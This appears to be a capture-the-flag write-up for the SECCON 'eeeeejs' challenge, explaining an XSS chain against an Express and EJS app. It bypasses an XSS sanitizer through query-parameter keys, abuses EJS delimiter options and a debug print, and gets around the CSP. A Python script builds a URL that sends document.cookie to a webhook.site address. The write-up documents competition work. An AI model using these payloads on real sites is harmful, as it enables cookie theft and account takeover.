## Source
We are given the following `index.js`:
```js
const express = require("express");
const { xss } = require("express-xss-sanitizer");
const { execFile } = require("node:child_process");
const util = require("node:util");

const app = express();
const PORT = 3000;

// Mitigation 1:
app.use(xss());

// Mitigation 2:
app.use((req, res, next) => {
  // A protection for RCE
  // FYI: https://github.com/mde/ejs/issues/735

  const evils = [
    "outputFunctionName",
    "escapeFunction",
    "localsName",
    "destructuredLocals",
    "escape",
  ];

  const data = JSON.stringify(req.query);
  if (evils.find((evil) => data.includes(evil))) {
    res.status(400).send("hacker?");
  } else {
    next();
  }
});

// Mitigation 3:
app.use((req, res, next) => {
  res.set("Content-Security-Policy", "default-src 'self'");
  next();
});

app.get("/", async (req, res) => {
  req.query.filename ??= "index.ejs";
  req.query.name ??= "ejs";

  const proc = await util
    .promisify(execFile)(
      "node",
      [
        // Mitigation 4:
        "--experimental-permission",
        `--allow-fs-read=${__dirname}/src`,

        "render.dist.js",
        JSON.stringify(req.query),
      ],
      {
        timeout: 2000,
        cwd: `${__dirname}/src`,
      }
    )
    .catch((e) => e);

  res.type("html").send(proc.killed ? "Timeout" : proc.stdout);
});

app.listen(PORT);
```
With the following `render.js`:
```js
const ejs = require("ejs");

const { filename, ...query } = JSON.parse(process.argv[2].trim());
ejs.renderFile(filename, query).then(console.log);
```
And there's also `index.ejs`:
```html
<marquee height="100%" scrollamount="16" direction="down" behavior="alternate">
  <marquee scrollamount="24" behavior="alternate">
    <h1>Hello, <%= name %>!</h1>
  </marquee>
</marquee>
```
### View options, XSS and CSP
So the goal is `XSS` and we control `query` which allows us to control the `view options`, which is a typical vector for `RCE` when passed to `renderFile` like this. However, 4 mitigations are in place, which seem to rule out `RCE`, but we can still control the delimiters within `view options`, besides some other options

We should also note that the CSP is `default-src 'self'`, so we need to take that into account when looking for `XSS`.

## express-xss-sanitizer bypass
One problem with this challenge, was that we thought the xss-sanitizer was not so easy to bypass. It took us a long time to realise that we could smuggle html tags within the keys of the query parameters, like so:
```
http://web:3000/?filename=render.dist.js&src[<img src=x onerror=alert(1)>]
```
The sanitizer doesn't touch those apparently.

## Gadget hunt
Let's look at what kind of view options we can control (already filtering out the `evils`):
```js
  options.client = opts.client || false;
  options.compileDebug = opts.compileDebug !== false;
  options.debug = !!opts.debug;
  options.filename = opts.filename;
  options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
  options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
  options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
  options.strict = opts.strict || false;
  options.context = opts.context;
  options.cache = opts.cache || false;
  options.rmWhitespace = opts.rmWhitespace;
  options.root = opts.root;
  options.includer = opts.includer;
  options.views = opts.views;
  options.async = opts.async;
  options.legacyInclude = typeof opts.legacyInclude != 'undefined' ? !!opts.legacyInclude : true;
  ```
The obvious ones are `openDelimiter`, `closeDelimiter`, `delimiter`, which were the only ones that we ended up using. With these we can render a filename of our choice and we have many option for what to render exactly within the file that we render. There are three files that we can choose from that we can render: `index.ejs`, `render.js` and `render.dist.js`. The last one being the obvious choice to hunt for gadgets. There was a lot to choose from and hopefully all teams will share which gadget they used after the deadline or maybe the author can compile an overview of the gadgets that the teams found. We ended up using the `console.log` (because `proc.stdout` was returned by `index.js`) that could be found in this snippet:
```js
if (opts.strict) {
    src = '"use strict";\n' + src;
}
if (opts.debug) {
    console.log(src);
}
if (opts.compileDebug && opts.filename) {
    src = src + "\n//# sourceURL=" + sanitizedFilename + "\n";
}
```
So here's an example with html injection:
```
http://eeeeejs.seccon.games:3000/?filename=render.dist.js&src[%3Ch1%3EHEY%3C/h1%3E]=UNESCAPED&settings[view%20options][delimiter]=%20&settings[view%20options][openDelimiter]=(opts.debug)&settings[view%20options][closeDelimiter]=%20%20%20%20%20%20%20var%20returnedFn%20=
```
Now we don't have `XSS` yet, because we still need to bypass the CSP, but we could just include a script tag with a `src` that will render this file again, but in this case the returned text will be evaluated as javascript. Now we can just use `src=JAVASCRIPT_PAYLOAD`, because we don't need html tags for this:
```
http://eeeeejs.seccon.games:3000/?filename=render.dist.js&src=alert(1)&settings[view%20options][delimiter]=%20&settings[view%20options][openDelimiter]=(opts.debug)&settings[view%20options][closeDelimiter]=%20%20%20%20%20%20%20var%20returnedFn%20=
```
Now we have everything to get the flag, although encoding was a bit tricky, but we write a script for that.

## Payload
We wrote the following script to generate our final url:
```py
import urllib.parse

webhook_url = 'https://webhook.site/cae461f6-3930-48bf-9cfd-d47cba2d0ff5'

script_payload = f"window.location.href=`{webhook_url}?`+document.cookie"
script_payload = urllib.parse.quote_plus(script_payload)

url = f"/?filename=render.dist.js&src={script_payload}&settings[view options][delimiter]=%20&settings[view options][openDelimiter]=(opts.debug)&settings[view%20options][closeDelimiter]=%20%20%20%20%20%20%20var%20returnedFn%20="
url = url.replace("[", "%5B")
url = url.replace("]", "%5D")

xss_payload = f"<script src='{url}'></script>"
xss_payload = urllib.parse.quote_plus(xss_payload)

final = f"http://web:3000/?filename=render.dist.js&src[{xss_payload}]=UNESCAPED&settings[view options][delimiter]=%20&settings[view%20options][openDelimiter]=(opts.debug)&settings[view%20options][closeDelimiter]=%20%20%20%20%20%20%20var%20returnedFn%20="
print(final)
```
Resulting in this url:
```
http://web:3000/?filename=render.dist.js&src[%3Cscript+src%3D%27%2F%3Ffilename%3Drender.dist.js%26src%3Dwindow.location.href%253D%2560https%253A%252F%252Fwebhook.site%252Fcae461f6-3930-48bf-9cfd-d47cba2d0ff5%253F%2560%252Bdocument.cookie%26settings%255Bview+options%255D%255Bdelimiter%255D%3D%2520%26settings%255Bview+options%255D%255BopenDelimiter%255D%3D%28opts.debug%29%26settings%255Bview%2520options%255D%255BcloseDelimiter%255D%3D%2520%2520%2520%2520%2520%2520%2520var%2520returnedFn%2520%3D%27%3E%3C%2Fscript%3E]=UNESCAPED&settings[view options][delimiter]=%20&settings[view%20options][openDelimiter]=(opts.debug)&settings[view%20options][closeDelimiter]=%20%20%20%20%20%20%20var%20returnedFn%20=
```
Which results in a request to our webhook:
```
https://webhook.site/cae461f6-3930-48bf-9cfd-d47cba2d0ff5?FLAG=SECCON{RCE_is_po55ible_if_mitigation_4_does_not_exist}
```
### Flag :triangular_flag_on_post:
```
SECCON{RCE_is_po55ible_if_mitigation_4_does_not_exist}
```
